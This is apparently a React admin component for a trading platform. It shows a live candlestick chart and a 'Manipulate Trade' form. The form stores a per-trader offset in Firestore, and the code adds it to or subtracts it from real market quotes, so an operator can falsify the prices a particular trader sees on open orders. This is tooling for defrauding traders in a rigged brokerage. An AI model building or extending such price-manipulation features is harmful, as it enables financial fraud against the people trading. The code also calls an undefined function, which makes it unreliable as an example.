import {
  Box,
  Button,
  MenuItem,
  Select,
  Stack,
  TextField,
  Typography,
} from "@mui/material";
import { createChart } from "lightweight-charts";
import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { useAssetsStore } from "../states/assetStores";
import {
  collection,
  doc,
  getDoc,
  onSnapshot,
  query,
  updateDoc,
  where,
} from "firebase/firestore";
import { db } from "../firebase";

const getTradeInformation = async (id) => {
  const data = await getDoc(doc(db, "orders", id));
  const dataSnap = data.data();

  return dataSnap;
};

const SingleTrade = () => {
  const { id, traderId, symbol } = useParams();
  const chartRef = useRef();
  const ws = useRef();
  const { AssetList, getAssetBySymbol } = useAssetsStore();
  const [tradeData, settradeData] = useState([]);
  const [selectedAsset, setselectedAsset] = useState(getAssetBySymbol(symbol));
  const lastCandleRef = useRef();
  const [price, setPrice] = useState(null);
  const [manipulationVal, setmanipulationVal] = useState(0);
  const [manipulationType, setmanipulationType] = useState(true);

  const setDefaultValues = async () => {
    const docRef = await getDoc(doc(db, "chartEdits", traderId));

    setmanipulationVal(docRef.data().assets[symbol].data);
    setmanipulationType(docRef.data().assets[symbol].increased);
  };

  useEffect(() => {
    setDefaultValues();
    const chart = createChart(chartRef.current, {
      layout: {
        background: { color: "#ffffff" },
        textColor: "#000",
      },
      rightPriceScale: {
        scaleMargins: {
          top: 0.2, // Adds padding above
          bottom: 0.2, // Adds padding below
        },
        borderVisible: false,
        entireTextOnly: true,
        ticksVisible: true,
      },
      timeScale: {
        borderVisible: false,
        timeVisible: true,
        secondsVisible: true,
      },
    });

    const candleSeries = chart.addCandlestickSeries();
    candleSeries.current = candleSeries;
    let url;
    let candles = [];

    if (selectedAsset.type == "Crypto") {
      url = `https://api.binance.com/api/v3/klines?symbol=${selectedAsset.historySymbol}&interval=1m&limit=500`;
    } else if (selectedAsset.type == "Metals") {
      url = `https://api.anzocapital.in/metals/${selectedAsset.historySymbol}/1m/`;
    } else if (selectedAsset.type == "CFD") {
      url = `https://api.anzocapital.in/metals/${selectedAsset.historySymbol}/1m/`;
    } else {
      url = `https://api.anzocapital.in/metals/${selectedAsset.historySymbol}/1m/`;
    }
    // Fetch the initial candles (using a 1-minute interval for this example)
    fetch(url)
      .then((res) => res.json())
      .then((data) => {
        candles = data.map((d) => {
          return {
            time: d[0] / 1000, // convert from ms to seconds
            open: parseFloat(d[1]),
            high: parseFloat(d[2]),
            low: parseFloat(d[3]),
            close: parseFloat(d[4]),
          };
        });
        candleSeries.setData(candles);
      });

    lastCandleRef.current = candles[candles.length - 1];

    // Set up WebSocket for real-time updates using your WebSocket URL
    const ws = new WebSocket("wss://ws.binaryws.com/websockets/v3?app_id=1089");

    ws.onopen = () => {
      console.log("connection established");
      ws.send(JSON.stringify({ ticks: symbol, subscribe: 1 }));
    };

    ws.onmessage = async (event) => {
      const data = JSON.parse(event.data);
      const userChartData = await getDoc(doc(db, "chartEdits", traderId));
      const tradeInfo = await getTradeInformation(id);

      settradeData(tradeInfo);

      if (data?.error?.code === "MarketIsClosed") {
        setPrice(data.error.message);
        setmarketClosed(true);
      }

      if (data.tick && data.tick.quote) {
        let currentPrice = 0;
        let chartData = userChartData.data()?.assets[data.tick.symbol];

        currentPrice = parseFloat(data.tick.quote);
        setPrice(data.tick.quote);

        if (chartData?.increased) {
          currentPrice = chartData?.data
            ? parseFloat(data.tick.quote) + parseFloat(chartData?.data)
            : parseFloat(data.tick.quote);
          setPrice(
            chartData?.data
              ? parseFloat(data.tick.quote) + parseFloat(chartData?.data)
              : parseFloat(data.tick.quote)
          );
        } else {
          currentPrice = chartData?.data
            ? parseFloat(data.tick.quote) - parseFloat(chartData?.data)
            : parseFloat(data.tick.quote);

          setPrice(
            chartData?.data
              ? parseFloat(data.tick.quote) - parseFloat(chartData?.data)
              : parseFloat(data.tick.quote)
          );
        }
        const timestamp = Math.floor(Date.now() / 1000); // current timestamp in seconds
        const interval = 60; // seconds
        const bucketTime = Math.floor(timestamp / interval) * interval;

        const lastCandle = lastCandleRef.current;

        if (lastCandle && lastCandle.time === bucketTime) {
          // Update the current candle if it's within the same minute
          lastCandle.close = currentPrice;
          lastCandle.high = Math.max(lastCandle.high, currentPrice);
          lastCandle.low = Math.min(lastCandle.low, currentPrice);
          candleSeries.update(lastCandle);
        } else {
          const newCandle = {
            time: bucketTime,
            open: currentPrice,
            high: currentPrice,
            low: currentPrice,
            close: currentPrice,
          };
          lastCandleRef.current = newCandle;
          candleSeries.update(newCandle);
        }
      }
    };

    // Handle WebSocket errors and closures
    ws.onerror = console.error;
    ws.onclose = () => console.log("WebSocket connection closed");

    return () => {
      ws.close();
      chart.remove();
    };
  }, [traderId, id]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const array = {
      increased: manipulationType,
      data: parseFloat(manipulationVal),
    };

    const docRef = doc(db, "chartEdits", traderId);

    await updateDoc(docRef, {
      [`assets.${symbol}`]: array,
    });
  };

  const handleReset = async (e) => {
    e.preventDefault();
    console.log("lol");

    const array = {
      increased: false,
      data: 0,
    };

    const docRef = doc(db, "chartEdits", traderId);

    await updateDoc(docRef, {
      [`assets.${symbol}`]: array,
    });
    setDefaultValues();
  };

  return (
    <Stack alignItems="center" justifyContent="space-between" direction="row">
      <Box sx={{ width: "70%", height: "90vh" }}>
        <div ref={chartRef} style={{ width: "100%", height: "100%" }}></div>
      </Box>
      <Stack
        sx={{ width: "30%", height: "80vh" }}
        spacing={5}
        alignItems="center"
        component="form"
        onSubmit={handleSubmit}
      >
        <Typography variant="h6" sx={{ fontWeight: "bold" }}>
          Manipulate Trade
        </Typography>
        <Stack
          direction="row"
          justifyContent="space-between"
          sx={{ width: "80%" }}
          gap={2}
        >
          <TextField
            placeholder="500"
            type="number"
            fullWidth
            label="Manipulation Value"
            required
            value={manipulationVal}
            onChange={(e) => setmanipulationVal(e.target.value)}
          />
          <Select
            required
            value={manipulationType}
            onChange={(e) => setmanipulationType(e.target.value)}
            sx={{ width: 200 }}
          >
            <MenuItem value={true}>
              <Typography>Up</Typography>
            </MenuItem>
            <MenuItem value={false}>
              <Typography>Down</Typography>
            </MenuItem>
          </Select>
        </Stack>
        <Stack sx={{ width: "80%" }} spacing={2}>
          <Button type="submit" variant="contained" fullWidth>
            Manipulate
          </Button>
          <Button
            type="button"
            onClick={handleReset}
            variant="contained"
            fullWidth
            sx={{ background: "red" }}
          >
            Reset
          </Button>
        </Stack>
        <Stack spacing={1} sx={{ width: "80%" }}>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              ID
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.id}
            </Typography>
          </Stack>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              Buy Price
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.buyPrice}
            </Typography>
          </Stack>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              Is Order Active
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.isOrderActive?.toString()}
            </Typography>
          </Stack>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              Asset
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.assetId}
            </Typography>
          </Stack>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              Order Value
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.lotsValue?.toLocaleString()}
            </Typography>
          </Stack>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              Set Loss
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.setLossValue || "None"}
            </Typography>
          </Stack>
          <Stack
            direction="row"
            justifyContent="space-between"
            sx={{ width: "100%" }}
          >
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              Take Profit
            </Typography>
            <Typography variant="h6" sx={{ fontSize: 16, fontWeight: "bold" }}>
              {tradeData?.takeProfitValue || "None"}
            </Typography>
          </Stack>
        </Stack>
      </Stack>
    </Stack>
  );
};

export default SingleTrade;
